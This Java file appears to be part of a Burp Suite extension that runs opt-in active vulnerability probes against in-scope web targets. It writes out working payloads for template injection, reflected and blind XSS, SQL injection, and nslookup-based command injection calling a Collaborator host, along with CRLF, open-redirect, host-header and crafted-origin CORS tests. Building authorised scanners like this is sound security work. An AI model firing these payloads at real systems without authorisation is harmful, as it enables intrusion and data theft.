package com.victor.reconloop;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.collaborator.CollaboratorClient;
import burp.api.montoya.collaborator.CollaboratorPayload;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;

import java.net.URI;
import java.util.*;
import java.util.regex.Pattern;

/**
 * Opt-in active vulnerability probing: SSRF and blind XSS via Burp Collaborator OOB interactions,
 * server-side template injection via arithmetic evaluation, reflected-XSS confirmation via a
 * metacharacter canary, and lightweight WAF fingerprinting.
 *
 * <p>Every request is scope-checked and throttled by the caller. Payload firing only happens when
 * the user has explicitly enabled active tests. Detection cores ({@link #detectSstiEval},
 * {@link #survivingXssChars}, {@link #fingerprintWaf}, {@link #encodeCorrelation}) are pure and
 * unit-tested; the Montoya-facing orchestration is deliberately thin.
 */
final class ActiveTestEngine {

    record ActiveFinding(String severity, String testClass, String parameter,
                         String evidence, boolean confirmed, String url) {}

    // Server-side template injection: distinctive product avoids coincidental "49" matches.
    static final long SSTI_A = 7, SSTI_B = 777, SSTI_PRODUCT = SSTI_A * SSTI_B; // 5439
    static final String SSTI_PREFIX = "rhs", SSTI_SUFFIX = "she";
    static final String SSTI_HIT = SSTI_PREFIX + SSTI_PRODUCT + SSTI_SUFFIX;

    private static final List<String> SSTI_PAYLOADS = List.of(
            SSTI_PREFIX + "{{7*777}}" + SSTI_SUFFIX,     // Jinja2 / Twig
            SSTI_PREFIX + "${7*777}" + SSTI_SUFFIX,      // JSP EL / Freemarker / Thymeleaf
            SSTI_PREFIX + "#{7*777}" + SSTI_SUFFIX,      // Ruby / JSF / Spring
            SSTI_PREFIX + "<%=7*777%>" + SSTI_SUFFIX,    // ERB / EJS
            SSTI_PREFIX + "${{7*777}}" + SSTI_SUFFIX,    // nested
            SSTI_PREFIX + "{7*777}" + SSTI_SUFFIX);      // simple brace

    private static final String XSS_TOKEN = "rhx";
    private static final String XSS_PROBE = "<img>\"'";
    private static final String WAF_PROBE = "<script>alert(1)</script>";

    // SQL injection: error-based, boolean-based blind, and time-based blind (MySQL/PostgreSQL/MSSQL).
    private static final Pattern SQL_ERROR = Pattern.compile(
            "sql syntax|unclosed quotation mark|quoted string not properly terminated|"
                    + "mysql_fetch|mysqli|you have an error in your sql syntax|warning: mysql|"
                    + "valid mysql result|check the manual that corresponds to your (mysql|mariadb) server|"
                    + "ora-\\d{5}|pg_query\\(\\)|postgresql.*error|sqlstate\\[|sqlite3?\\.(operationalerror|error)|"
                    + "microsoft ole db provider for odbc drivers|incorrect syntax near|"
                    + "unterminated quoted string|System\\.Data\\.SqlClient\\.SqlException",
            Pattern.CASE_INSENSITIVE);
    private static final String SQLI_ERROR_PAYLOAD = "'";
    private static final String SQLI_TRUE_PAYLOAD = "' OR '1'='1'-- -";
    private static final String SQLI_FALSE_PAYLOAD = "' AND '1'='2'-- -";
    private static final List<String> SQLI_TIME_PAYLOADS = List.of(
            "' OR SLEEP(5)-- -",            // MySQL / MariaDB
            "'; SELECT PG_SLEEP(5)-- -",     // PostgreSQL
            "'; WAITFOR DELAY '0:0:5'-- -"); // MSSQL
    private static final int SQLI_TIME_DELAY_SECONDS = 5;

    // CORS: crafted attacker-controlled Origin headers targeting the specific validation bugs real
    // apps ship — naive contains/startsWith/endsWith checks, missing dot-boundary requirements, and
    // scheme-blind comparisons — not just whatever Origin happened to appear in observed traffic.
    private static final String CORS_ARBITRARY_ORIGIN = "https://recon-hound-cors-probe.invalid";
    private static final String CORS_NULL_ORIGIN = "null";

    private final MontoyaApi api;
    private final long throttleMillis;
    private volatile CollaboratorClient collaborator;

    ActiveTestEngine(MontoyaApi api, long throttleMillis) {
        this.api = api;
        this.throttleMillis = throttleMillis;
    }

    void setCollaborator(CollaboratorClient collaborator) { this.collaborator = collaborator; }

    /** Runs the enabled active probes against every non-cookie parameter of {@code base}. */
    List<ActiveFinding> test(HttpRequest base, int maxRequests) {
        if (base == null) return List.of();
        List<ActiveFinding> findings = new ArrayList<>();
        int budget = maxRequests;

        List<HttpParameter> parameters;
        try {
            parameters = new ArrayList<>(base.parameters());
        } catch (Exception e) {
            return List.of();
        }

        boolean wafChecked = false;
        for (HttpParameter parameter : parameters) {
            if (parameter == null || parameter.name() == null || parameter.name().isBlank()) continue;
            if ("COOKIE".equalsIgnoreCase(String.valueOf(parameter.type()))) continue;
            if (budget <= 0) break;

            if (!wafChecked) {
                budget -= testWaf(base, parameter, findings);
                wafChecked = true;
            }
            if (budget > 0) budget -= testReflectedXss(base, parameter, findings);
            if (budget > 0) budget -= testSsti(base, parameter, findings);
            if (budget > 0) budget -= testSsrf(base, parameter, findings);
            if (budget > 0) budget -= testBlindXss(base, parameter, findings);
            if (budget > 0) budget -= testCommandInjection(base, parameter, findings);
            if (budget > 0) budget -= testOpenRedirect(base, parameter, findings);
            if (budget > 0) budget -= testCrlf(base, parameter, findings);
            if (budget > 0) budget -= testSqli(base, parameter, findings);
        }
        if (budget > 0) budget -= testHostHeaderInjection(base, findings);
        if (budget > 0) budget -= testCors(base, findings);
        return findings;
    }

    private int testWaf(HttpRequest base, HttpParameter parameter, List<ActiveFinding> out) {
        HttpResponse response = sendMutated(base, parameter, WAF_PROBE);
        if (response == null) return 1;
        Optional<String> waf = fingerprintWaf(response.statusCode(),
                response.bodyToString(), response.headerValue("Server"));
        waf.ifPresent(vendor -> out.add(new ActiveFinding("INFO", "WAF", parameter.name(),
                "Likely WAF/filter: " + vendor + " (status " + response.statusCode() + ")", true, base.url())));
        return 1;
    }

    private int testReflectedXss(HttpRequest base, HttpParameter parameter, List<ActiveFinding> out) {
        String token = XSS_TOKEN + Integer.toString(parameter.name().hashCode() & 0xffff, 36);
        HttpResponse response = sendMutated(base, parameter, token + XSS_PROBE);
        if (response == null) return 1;
        String surviving = survivingXssChars(response.bodyToString(), token);
        if (!surviving.isEmpty()) {
            String severity = (surviving.contains("<") && surviving.contains(">")) ? "HIGH" : "MEDIUM";
            out.add(new ActiveFinding(severity, "XSS", parameter.name(),
                    "Reflected metacharacters survived unencoded: " + surviving, true, base.url()));
        }
        return 1;
    }

    private int testSsti(HttpRequest base, HttpParameter parameter, List<ActiveFinding> out) {
        int sent = 0;
        for (String payload : SSTI_PAYLOADS) {
            HttpResponse response = sendMutated(base, parameter, payload);
            sent++;
            if (response == null) continue;
            Optional<String> engine = detectSstiEval(response.bodyToString(), payload);
            if (engine.isPresent()) {
                out.add(new ActiveFinding("HIGH", "SSTI", parameter.name(),
                        "Template arithmetic evaluated (" + SSTI_A + "*" + SSTI_B + "=" + SSTI_PRODUCT
                                + ") via " + engine.get(), true, base.url()));
                break;
            }
        }
        return sent;
    }

    private int testSsrf(HttpRequest base, HttpParameter parameter, List<ActiveFinding> out) {
        CollaboratorClient client = collaborator;
        if (client == null) return 0;
        String correlation = encodeCorrelation("SSRF", parameter.name(), base.url());
        CollaboratorPayload payload = client.generatePayload(correlation);
        HttpResponse response = sendMutated(base, parameter, "http://" + payload + "/");
        if (response != null && response.bodyToString().contains(payload.toString())) {
            out.add(new ActiveFinding("HIGH", "SSRF", parameter.name(),
                    "Collaborator host reflected in response (probable full-response SSRF)", true, base.url()));
        } else {
            out.add(new ActiveFinding("INFO", "SSRF", parameter.name(),
                    "Collaborator SSRF payload sent; awaiting OOB interaction", false, base.url()));
        }
        return 1;
    }

    private int testBlindXss(HttpRequest base, HttpParameter parameter, List<ActiveFinding> out) {
        CollaboratorClient client = collaborator;
        if (client == null) return 0;
        String correlation = encodeCorrelation("XSS-blind", parameter.name(), base.url());
        CollaboratorPayload payload = client.generatePayload(correlation);
        sendMutated(base, parameter, "\"><script src=//" + payload + "></script>");
        out.add(new ActiveFinding("INFO", "XSS-blind", parameter.name(),
                "Blind-XSS beacon sent; awaiting OOB interaction", false, base.url()));
        return 1;
    }

    private int testCommandInjection(HttpRequest base, HttpParameter parameter, List<ActiveFinding> out) {
        CollaboratorClient client = collaborator;
        if (client == null) return 0;
        String correlation = encodeCorrelation("CMDi", parameter.name(), base.url());
        CollaboratorPayload payload = client.generatePayload(correlation);
        // Separator variants so at least one survives sh/cmd quoting contexts.
        sendMutated(base, parameter, ";nslookup " + payload + ";");
        sendMutated(base, parameter, "|nslookup " + payload);
        sendMutated(base, parameter, "$(nslookup " + payload + ")");
        out.add(new ActiveFinding("INFO", "CMDi", parameter.name(),
                "Blind command-injection DNS probes sent; awaiting OOB interaction", false, base.url()));
        return 3;
    }

    private int testOpenRedirect(HttpRequest base, HttpParameter parameter, List<ActiveFinding> out) {
        String marker = "rh-redirect.example.net";
        HttpResponse response = sendMutated(base, parameter, "https://" + marker + "/");
        if (response == null) return 1;
        Optional<String> hit = detectOpenRedirect(response.statusCode(), response.headerValue("Location"), marker);
        hit.ifPresent(location -> out.add(new ActiveFinding("MEDIUM", "OpenRedirect", parameter.name(),
                "Redirect Location points to attacker-controlled host: " + location, true, base.url())));
        return 1;
    }

    private int testCrlf(HttpRequest base, HttpParameter parameter, List<ActiveFinding> out) {
        String injected = "rhcrlf%0d%0aX-Recon-Hound%3a%20injected";
        HttpResponse response = sendMutated(base, parameter, injected);
        if (response != null && response.headerValue("X-Recon-Hound") != null) {
            out.add(new ActiveFinding("HIGH", "CRLF", parameter.name(),
                    "Injected CRLF produced a new response header (X-Recon-Hound)", true, base.url()));
        }
        return 1;
    }

    private int testSqli(HttpRequest base, HttpParameter parameter, List<ActiveFinding> out) {
        int sent = 0;

        HttpResponse baseline = sendMutated(base, parameter, parameter.value());
        sent++;
        if (baseline == null) return sent;
        String baselineBody = baseline.bodyToString();

        HttpResponse errorResponse = sendMutated(base, parameter, SQLI_ERROR_PAYLOAD);
        sent++;
        if (errorResponse != null && containsSqlError(errorResponse.bodyToString()) && !containsSqlError(baselineBody)) {
            out.add(new ActiveFinding("HIGH", "SQLi", parameter.name(),
                    "Injecting a single quote produced a database error signature not present in the baseline response",
                    true, base.url()));
            return sent;
        }

        HttpResponse trueResponse = sendMutated(base, parameter, SQLI_TRUE_PAYLOAD);
        HttpResponse falseResponse = sendMutated(base, parameter, SQLI_FALSE_PAYLOAD);
        sent += 2;
        if (trueResponse != null && falseResponse != null
                && looksBooleanBased(baselineBody, trueResponse.bodyToString(), falseResponse.bodyToString())) {
            out.add(new ActiveFinding("HIGH", "SQLi", parameter.name(),
                    "Boolean-based blind: the always-true condition matches the baseline response while the "
                            + "always-false condition diverges from both", true, base.url()));
            return sent;
        }

        long baselineMillis = timeRequest(base, parameter, parameter.value());
        sent++;
        for (String payload : SQLI_TIME_PAYLOADS) {
            long payloadMillis = timeRequest(base, parameter, payload);
            sent++;
            if (looksTimeBased(baselineMillis, payloadMillis, SQLI_TIME_DELAY_SECONDS)) {
                out.add(new ActiveFinding("HIGH", "SQLi", parameter.name(),
                        "Time-based blind: response time increased by ~" + SQLI_TIME_DELAY_SECONDS
                                + "s in response to payload " + payload, true, base.url()));
                break;
            }
        }
        return sent;
    }

    private long timeRequest(HttpRequest base, HttpParameter parameter, String value) {
        long start = System.currentTimeMillis();
        sendMutated(base, parameter, value);
        return System.currentTimeMillis() - start;
    }

    private int testHostHeaderInjection(HttpRequest base, List<ActiveFinding> out) {
        CollaboratorClient client = collaborator;
        if (client == null) return 0;
        String correlation = encodeCorrelation("HostHeader", "Host", base.url());
        CollaboratorPayload payload = client.generatePayload(correlation);
        try {
            if (!api.scope().isInScope(base.url())) return 0;
            api.http().sendRequest(base.withUpdatedHeader("X-Forwarded-Host", payload.toString()));
            throttle();
            out.add(new ActiveFinding("INFO", "HostHeader", "X-Forwarded-Host",
                    "X-Forwarded-Host set to Collaborator host; awaiting OOB (reset-poisoning/cache)", false, base.url()));
        } catch (Exception e) {
            api.logging().logToError("Host-header probe failed", e);
        }
        return 1;
    }

    /**
     * Actively confirms CORS misconfiguration by replaying {@code base} with crafted, attacker-chosen
     * {@code Origin} headers and checking whether the server trusts them — much stronger evidence than
     * passively observing whatever Origin happened to appear in traffic (see
     * {@link WebHygieneEngine#analyzeCors}), since it specifically targets naive origin-validation bugs.
     */
    private int testCors(HttpRequest base, List<ActiveFinding> out) {
        List<String> origins = craftCorsProbeOrigins(hostOf(base.url()));
        int sent = 0;
        for (String origin : origins) {
            try {
                if (!api.scope().isInScope(base.url())) break;
                HttpRequestResponse rr = api.http().sendRequest(base.withUpdatedHeader("Origin", origin));
                sent++;
                throttle();
                if (rr == null || rr.response() == null) continue;
                HttpResponse response = rr.response();
                String acao = response.headerValue("Access-Control-Allow-Origin");
                if (corsReflectsOrigin(origin, acao)) {
                    String acac = response.headerValue("Access-Control-Allow-Credentials");
                    boolean credentials = acac != null && acac.trim().equalsIgnoreCase("true");
                    String kind = CORS_NULL_ORIGIN.equalsIgnoreCase(origin) ? "null Origin" : "crafted attacker Origin (" + origin + ")";
                    out.add(new ActiveFinding(credentials ? "HIGH" : "MEDIUM", "CORS", "Origin",
                            "Server reflected a " + kind + " in Access-Control-Allow-Origin"
                                    + (credentials ? " with Allow-Credentials:true — full cross-origin credentialed read." : "."),
                            true, base.url()));
                }
            } catch (Exception e) {
                api.logging().logToError("CORS probe failed for " + base.url(), e);
            }
        }
        return sent;
    }

    private HttpResponse sendMutated(HttpRequest base, HttpParameter parameter, String value) {
        try {
            if (!api.scope().isInScope(base.url())) return null;
            HttpParameter mutated = HttpParameter.parameter(parameter.name(), value, parameter.type());
            HttpRequestResponse rr = api.http().sendRequest(base.withUpdatedParameters(mutated));
            throttle();
            return rr == null ? null : rr.response();
        } catch (Exception e) {
            api.logging().logToError("Active probe failed for " + parameter.name(), e);
            return null;
        }
    }

    private void throttle() {
        if (throttleMillis <= 0) return;
        try { Thread.sleep(throttleMillis); } catch (InterruptedException e) { Thread.currentThread().interrupt(); }
    }

    // ---- pure detection cores (unit-tested) ----

    /** Returns the template engine family if the arithmetic marker evaluated, else empty. */
    static Optional<String> detectSstiEval(String body, String payload) {
        if (body == null || !body.contains(SSTI_HIT)) return Optional.empty();
        String family;
        if (payload.contains("{{")) family = "Jinja2/Twig-style {{...}}";
        else if (payload.contains("${{")) family = "nested ${{...}}";
        else if (payload.contains("${")) family = "EL/Freemarker ${...}";
        else if (payload.contains("#{")) family = "Ruby/JSF #{...}";
        else if (payload.contains("<%=")) family = "ERB/EJS <%=...%>";
        else family = "brace {...}";
        return Optional.of(family);
    }

    /** Of {@code < > " '}, which appear literally in the body immediately after {@code token}. */
    static String survivingXssChars(String body, String token) {
        if (body == null || token == null) return "";
        int index = body.indexOf(token);
        if (index < 0) return "";
        int end = Math.min(body.length(), index + token.length() + 16);
        String tail = body.substring(index + token.length(), end);
        StringBuilder surviving = new StringBuilder();
        for (char c : new char[]{'<', '>', '"', '\''}) {
            if (tail.indexOf(c) >= 0) surviving.append(c);
        }
        return surviving.toString();
    }

    /** Best-effort WAF/filter vendor identification from a blocked response. */
    static Optional<String> fingerprintWaf(int status, String body, String server) {
        String haystack = ((server == null ? "" : server) + "\n" + (body == null ? "" : body))
                .toLowerCase(Locale.ROOT);
        String[][] signatures = {
                {"cloudflare", "Cloudflare"},
                {"cf-ray", "Cloudflare"},
                {"attention required", "Cloudflare"},
                {"akamai", "Akamai"},
                {"incapsula", "Imperva Incapsula"},
                {"imperva", "Imperva"},
                {"mod_security", "ModSecurity"},
                {"modsecurity", "ModSecurity"},
                {"the requested url was rejected", "F5 BIG-IP ASM"},
                {"big-ip", "F5 BIG-IP"},
                {"sucuri", "Sucuri"},
                {"barracuda", "Barracuda"},
                {"aws", "AWS WAF"},
                {"x-amzn-waf", "AWS WAF"},
                {"wordfence", "Wordfence"},
        };
        for (String[] signature : signatures) {
            if (haystack.contains(signature[0])) return Optional.of(signature[1]);
        }
        if (status == 406 || status == 501 || status == 999
                || (status == 403 && haystack.contains("access denied"))) {
            return Optional.of("generic (blocked with status " + status + ")");
        }
        return Optional.empty();
    }

    /** Open redirect confirmed when a 3xx Location points at the injected marker host. */
    static Optional<String> detectOpenRedirect(int status, String location, String marker) {
        if (location == null || status < 300 || status >= 400) return Optional.empty();
        String lower = location.toLowerCase(Locale.ROOT);
        String host = marker.toLowerCase(Locale.ROOT);
        // Match //marker, https://marker, or scheme-relative — but not marker appearing only in a query value.
        if (lower.startsWith("http://" + host) || lower.startsWith("https://" + host)
                || lower.startsWith("//" + host) || lower.equals(host) || lower.startsWith(host + "/")) {
            return Optional.of(location);
        }
        return Optional.empty();
    }

    /** True if {@code body} contains a recognizable database-error signature. */
    static boolean containsSqlError(String body) {
        return body != null && !body.isEmpty() && SQL_ERROR.matcher(body).find();
    }

    /**
     * Boolean-based blind confirmation: the always-true payload's response should look like the
     * baseline (same underlying condition held), while the always-false payload's response should
     * diverge from both — the classic boolean-blind divergence signature.
     */
    static boolean looksBooleanBased(String baselineBody, String trueBody, String falseBody) {
        if (baselineBody == null || trueBody == null || falseBody == null) return false;
        boolean trueMatchesBaseline = closeEnough(baselineBody, trueBody);
        boolean falseMatchesBaseline = closeEnough(baselineBody, falseBody);
        boolean trueMatchesFalse = closeEnough(trueBody, falseBody);
        return trueMatchesBaseline && !falseMatchesBaseline && !trueMatchesFalse;
    }

    /** Two response bodies are "the same page" if identical, or within ~1% (min 5 chars) in length. */
    static boolean closeEnough(String a, String b) {
        if (a == null || b == null) return false;
        if (a.equals(b)) return true;
        int diff = Math.abs(a.length() - b.length());
        int tolerance = Math.max(5, Math.max(a.length(), b.length()) / 100);
        return diff <= tolerance;
    }

    /** Time-based blind confirmation: the payload response took at least ~{@code delaySeconds} longer. */
    static boolean looksTimeBased(long baselineMillis, long payloadMillis, int delaySeconds) {
        long expectedDelta = delaySeconds * 1000L;
        return (payloadMillis - baselineMillis) >= expectedDelta - 1000;
    }

    /**
     * Attacker-chosen {@code Origin} values worth trying against {@code host}: an origin wholly
     * unrelated to the target (catches "trust anything"), the {@code null} origin (sandboxed
     * iframes/data: URLs), and — when the host is known — three payloads that specifically defeat
     * common naive origin-validation bugs: appending an attacker suffix after the trusted host (naive
     * {@code startsWith}/{@code contains} checks), prepending "evil" directly onto the host with no
     * separator (naive {@code endsWith}/{@code contains} checks missing a dot-boundary requirement),
     * and downgrading the scheme (checks that compare only the host, ignoring scheme).
     */
    static List<String> craftCorsProbeOrigins(String host) {
        List<String> origins = new ArrayList<>();
        origins.add(CORS_ARBITRARY_ORIGIN);
        origins.add(CORS_NULL_ORIGIN);
        if (host != null && !host.isBlank()) {
            origins.add("https://" + host + ".recon-hound-probe.invalid");
            origins.add("https://evil" + host);
            origins.add("http://" + host);
        }
        return origins;
    }

    /** True if the server trusted our crafted Origin by reflecting it back verbatim. */
    static boolean corsReflectsOrigin(String sentOrigin, String acao) {
        return sentOrigin != null && acao != null && acao.trim().equalsIgnoreCase(sentOrigin.trim());
    }

    /** Best-effort host extraction for building host-dependent CORS bypass payloads; null on failure. */
    static String hostOf(String url) {
        try {
            return url == null ? null : URI.create(url).getHost();
        } catch (Exception e) {
            return null;
        }
    }

    static String encodeCorrelation(String testClass, String parameter, String url) {
        return "AC|" + testClass + "|" + parameter + "|" + (url == null ? "" : url.replace("|", "%7C"));
    }

    static String[] decodeCorrelation(String customData) {
        if (customData == null || !customData.startsWith("AC|")) return null;
        String[] parts = customData.split("\\|", 4);
        if (parts.length != 4) return null;
        return new String[]{parts[1], parts[2], parts[3].replace("%7C", "|")};
    }
}
